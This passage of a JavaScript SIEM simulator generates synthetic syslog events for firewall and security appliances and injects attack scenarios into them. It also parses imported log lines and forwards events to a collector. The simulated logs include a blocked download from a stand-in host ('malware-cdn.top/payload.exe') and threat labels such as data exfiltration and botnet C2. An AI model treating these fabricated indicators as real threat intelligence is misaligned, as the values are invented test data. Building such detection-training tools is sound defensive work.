        const base = () => ({ srcType: 'pfsense', vendor: 'pfsense', host, facility: FACILITY.local0, program: 'filterlog', proto: 'tcp', protoNum: 6 });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const block = rand.chance(0.4);
          evs.push(Object.assign(base(), { severity: block ? 5 : 6, action: block ? 'block' : 'pass', direction: 'in', ruleId: rand.int(1, 20),
            srcIp: rand.chance(0.5) ? rand.ip() : rand.internalIp(), dstIp: rand.internalIp(),
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 22]), message: block ? 'filterlog block in' : 'filterlog pass in' }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), { severity: 5, action: 'pass', direction: 'out', ruleId: rand.int(1, 20),
          srcIp: internal, dstIp: badDst, srcPort: rand.int(1024, 65535), dstPort: 443,
          message: `filterlog pass out to flagged ${badDst}` }));
        return evs;
      },
    },
    juniper: {
      label: 'Juniper SRX', category: 'appliance',
      build() {
        const host = rand.pick(['srx-edge-01', 'srx-dc']);
        const base = () => ({ srcType: 'juniper', vendor: 'juniper', host, facility: FACILITY.local4, program: 'RT_FLOW', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const deny = rand.chance(0.3);
          evs.push(Object.assign(base(), { severity: deny ? 5 : 6, action: deny ? 'deny' : 'permit',
            srcIp: rand.chance(0.5) ? rand.ip() : rand.internalIp(), dstIp: rand.internalIp(),
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 53]), service: rand.pick(['junos-https', 'junos-dns', 'junos-http']),
            policy: deny ? 'default-deny' : 'trust-to-untrust', message: `RT_FLOW session ${deny ? 'denied' : 'created'}` }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), { severity: 5, action: 'permit', srcIp: internal, dstIp: badDst, fromZone: 'trust', toZone: 'untrust',
          srcPort: rand.int(1024, 65535), dstPort: 443, service: 'junos-https', policy: 'permit-outbound',
          message: `RT_FLOW session created to flagged ${badDst}` }));
        return evs;
      },
    },
    sonicwall: {
      label: 'SonicWall', category: 'appliance',
      build() {
        const host = rand.pick(['SNWL-TZ', 'sonicwall-01']);
        const base = () => ({ srcType: 'sonicwall', vendor: 'sonicwall', host, hostIp: '10.0.0.1', facility: FACILITY.local0, program: 'sonicwall', proto: 'tcp', serial: '0006B1' + rand.int(100000, 999999) });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, category: 1024, msgId: 97, action: 'allow',
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]),
            message: 'Connection Opened' }));
        }
        const sig = rand.pick(['IPS Detection Alert: Suspected Port Scan', 'Possible SYN Flood', 'Malformed packet dropped']);
        evs.push(Object.assign(base(), { severity: 2, category: 32, msgId: 82, action: 'deny',
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', message: sig }));
        return evs;
      },
    },
    zscaler: {
      label: 'Zscaler ZIA', category: 'appliance',
      build() {
        const host = 'zscaler-nss', base = () => ({ srcType: 'zscaler', vendor: 'zscaler', host, facility: FACILITY.local5, program: 'zscalernss', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'Allowed', category: rand.pick(['Business', 'News', 'Search Engines']), method: 'GET', status: 200,
            user: rand.pick(USERS) + '@corp', srcIp: rand.internalIp(), dstIp: rand.ip(),
            srcPort: rand.int(1024, 65535), dstPort: 443, url: rand.pick(['https://portal.example.com', 'https://news.example.net', 'https://docs.corp.local']),
            message: 'web request allowed' }));
        }
        const sig = rand.pick(['Win32.Trojan.Emotet', 'JS.Downloader.GenericKD', 'EICAR-Test-File', 'Phishing.Kit.Generic']);
        evs.push(Object.assign(base(), { severity: 2, action: 'Blocked', category: 'Malware', urlClass: 'Security Risk', method: 'GET', status: 403,
          user: rand.pick(USERS) + '@corp', srcIp: rand.internalIp(), dstIp: rand.pick(THREAT_INTEL.ips),
          srcPort: rand.int(1024, 65535), dstPort: 443, url: 'http://malware-cdn.top/payload.exe',
          threatSig: sig, threatSev: 'critical', message: `blocked malware download (${sig})` }));
        return evs;
      },
    },
    f5: {
      label: 'F5 BIG-IP ASM', category: 'appliance',
      build() {
        const host = rand.pick(['bigip-asm-01', 'f5-waf']);
        const base = () => ({ srcType: 'f5', vendor: 'f5', host, hostIp: '10.0.0.5', facility: FACILITY.local4, program: 'ASM', proto: 'tcp', app: 'shop', policy: 'prod_waf' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'passed', status: 200, method: 'GET', url: rand.pick(['/', '/cart', '/api/v1/orders']),
            srcIp: rand.ip(), dstIp: '10.10.1.11', srcPort: rand.int(1024, 65535), dstPort: 443, sevName: 'Informational', message: 'request passed WAF policy' }));
        }
        const sig = rand.pick(['SQL-Injection', 'Cross-Site-Scripting-(XSS)', 'Command-Execution', 'Predictable-Resource-Location']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', status: 0, method: 'POST', url: '/login',
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: '10.10.1.11', srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', sevName: 'Critical', message: `WAF blocked ${sig}` }));
        return evs;
      },
    },
    cef: {
      label: 'CEF (generic)', category: 'appliance',
      build() {
        const host = rand.pick(['arcsight-conn', 'siem-cef']);
        const base = () => ({ srcType: 'cef', vendor: 'cef', vendorName: 'Security', productName: 'ThreatManager', host, facility: FACILITY.local2, program: 'CEF', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'permitted', cefSev: 3, sigId: rand.int(100, 200),
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]), message: 'Traffic Permitted' }));
        }
        const sig = rand.pick(['Brute Force Attack Detected', 'Malware Communication', 'Data Exfiltration Attempt']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', cefSev: 9, sigId: rand.int(900, 999),
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'critical', message: sig }));
        return evs;
      },
    },
    leef: {
      label: 'LEEF (generic)', category: 'appliance',
      build() {
        const host = rand.pick(['qradar-src', 'siem-leef']);
        const base = () => ({ srcType: 'leef', vendor: 'leef', vendorName: 'Lancope', productName: 'StealthWatch', host, facility: FACILITY.local2, program: 'LEEF', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'allowed', leefCat: 'flow', leefSev: 3,
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]), message: 'Flow Permitted' }));
        }
        const sig = rand.pick(['Port Scan Detected', 'Suspect Data Loss', 'Botnet C2 Communication']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', leefCat: 'attack', leefSev: 9,
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', message: sig }));
        return evs;
      },
    },
  };
  Object.assign(SCENARIOS, APPLIANCE);

  // Best-effort parse of an arbitrary imported log line into an event so it can
  // flow through the SIEM (stream, drawer, and IP-based detection rules).
  const IP_RE = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
  function parseRawLine(line) {
    let severity = 6, facility = 1, msg = line, host = 'imported';
    const m = line.match(/^<(\d+)>/);
    if (m) { const pri = +m[1]; facility = Math.floor(pri / 8); severity = pri % 8; msg = line.slice(m[0].length); }
    const h = msg.match(/^[A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2}\s+(\S+)/) || // RFC 3164
              msg.match(/^\S+T\d{2}:\d{2}:\d{2}\S*\s+(\S+)/);                  // RFC 5424 / ISO
    if (h) host = h[1];
    const ips = line.match(IP_RE) || [];
    return {
      srcType: 'file', host, hostIp: '', facility, severity, program: 'import',
      srcIp: ips[0] || null, dstIp: ips[1] || null,
      message: msg.trim().slice(0, 300),
      rawOverride: line,
    };
  }

  // ---- Syslogger engine -----------------------------------------------------
  class Syslogger {
    constructor(sink) {
      this.sink = sink;             // function(event)
      this.eps = 8;                 // baseline events per second
      this.format = 'rfc3164';
      this.running = false;
      this._accumulator = 0;
      this._timer = null;
      this._tickMs = 100;
      this.emitted = 0;
      this.maxEvents = null;        // null = unlimited; else total cap
      this.collectorIp = '10.0.0.100';
      this.collectorPort = 514;
      this.onStop = null;           // callback(reason) when auto-stopped
      // File replay
      this.fileLines = [];
      this.fileName = null;
      this.fileMode = false;        // when true + file loaded, replay file instead of baseline
      this.loop = true;
      this._filePtr = 0;
      // Live forwarding to a real collector (requires the Node backend)
      this.forwarding = false;
      this.forwardProto = 'udp';
      this.forwardedCount = 0;
      this.forwardError = null;
      this._fwdQueue = [];
      this._fwdBusy = false;
      setInterval(() => this._flushForward(), 500);
    }

    setEps(v) { this.eps = Math.max(0, v); }
    setFormat(f) { this.format = f; }
    setMaxEvents(v) { this.maxEvents = (v == null || v <= 0) ? null : Math.floor(v); }
    setCollector(ip, port) { this.collectorIp = ip || this.collectorIp; this.collectorPort = port || this.collectorPort; }
    setFileMode(b) { this.fileMode = !!b; }
    setLoop(b) { this.loop = !!b; }
    loadFile(lines, name) { this.fileLines = lines || []; this.fileName = name || null; this._filePtr = 0; }
    resetCounters() { this.emitted = 0; this._filePtr = 0; this.forwardedCount = 0; }
    setForwarding(b) { this.forwarding = !!b; if (!b) this._fwdQueue.length = 0; else this.forwardError = null; }
    setForwardProto(p) { this.forwardProto = p; }

    start() {
      if (this.running) return;
      this.running = true;
      this._timer = setInterval(() => this._tick(), this._tickMs);
    }

    stop() {
      this.running = false;
      clearInterval(this._timer);
      this._timer = null;
    }

    _tick() {
      this._accumulator += (this.eps * this._tickMs) / 1000;
      let n = Math.floor(this._accumulator);
      this._accumulator -= n;
      const replay = this.fileMode && this.fileLines.length > 0;
      while (n-- > 0) {
        if (replay) this._emitFileLine(); else this._emitBaseline();
        if (!this.running) break;   // the volume cap or EOF may have stopped us
      }
    }

    _finalize(partial) {
      if (this.maxEvents != null && this.emitted >= this.maxEvents) { this._hitLimit(); return null; }
      const ev = Object.assign({ id: rand.id(), ts: Date.now(), pid: null }, partial);
      ev.collector = `${this.collectorIp}:${this.collectorPort}`;
      if (ev.rawOverride) ev.raw = ev.rawOverride;
      else if (ev.vendor && VENDOR_FORMATTERS[ev.vendor]) ev.raw = VENDOR_FORMATTERS[ev.vendor](ev);
      else ev.raw = formatSyslog(ev, this.format);
      this.emitted++;
      if (this.forwarding) { this._fwdQueue.push(ev.raw); if (this._fwdQueue.length > 20000) this._fwdQueue.splice(0, 10000); }
      this.sink(ev);
      if (this.maxEvents != null && this.emitted >= this.maxEvents) this._hitLimit();
      return ev;
    }

    // Relay queued raw lines to the backend, which emits real UDP/TCP syslog.
    _flushForward() {
      if (!this.forwarding || this._fwdBusy || !this._fwdQueue.length) return;
      if (typeof fetch !== 'function') { this.forwardError = 'forwarding needs the Node backend'; return; }
      this._fwdBusy = true;
      const batch = this._fwdQueue.splice(0, 1000);
      fetch('/forward', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: this.collectorIp, port: this.collectorPort, proto: this.forwardProto, lines: batch }),
      })
        .then((r) => r.json())
        .then((d) => {
          if (d && d.ok) { this.forwardedCount += d.sent; this.forwardError = null; }
          else { this.forwardError = (d && d.error) || 'collector unreachable'; }
        })
        .catch(() => { this.forwardError = 'backend not running — start: node server.js'; })
        .finally(() => { this._fwdBusy = false; });
    }

    _hitLimit() {
      if (!this.running) return;
      this.stop();
      if (this.onStop) this.onStop('limit');
    }

    _emitBaseline() {
      const src = weightedSource();
      this._finalize(BASELINE[src]());
    }

    _emitFileLine() {
      if (this._filePtr >= this.fileLines.length) {
        if (this.loop) { this._filePtr = 0; }
        else { this.stop(); if (this.onStop) this.onStop('eof'); return; }
      }
      const line = this.fileLines[this._filePtr++];
      this._finalize(parseRawLine(line));
    }

    // Inject a named attack scenario as a rapid burst of events.
    injectScenario(name) {
      const scenario = SCENARIOS[name];
      if (!scenario) return;
      const events = scenario.build();
      // Spread the burst over a short window so correlation windows see it live.
      // Scenarios can be injected even while the baseline is stopped.
      events.forEach((partial, i) => {
        setTimeout(() => this._finalize(partial), i * rand.int(30, 90));
      });
    }

    static scenarioList() {
      return Object.entries(SCENARIOS).map(([id, s]) => ({ id, label: s.label, category: s.category || 'attack' }));
    }
  }

  global.JS.Syslogger = Syslogger;
})(window);
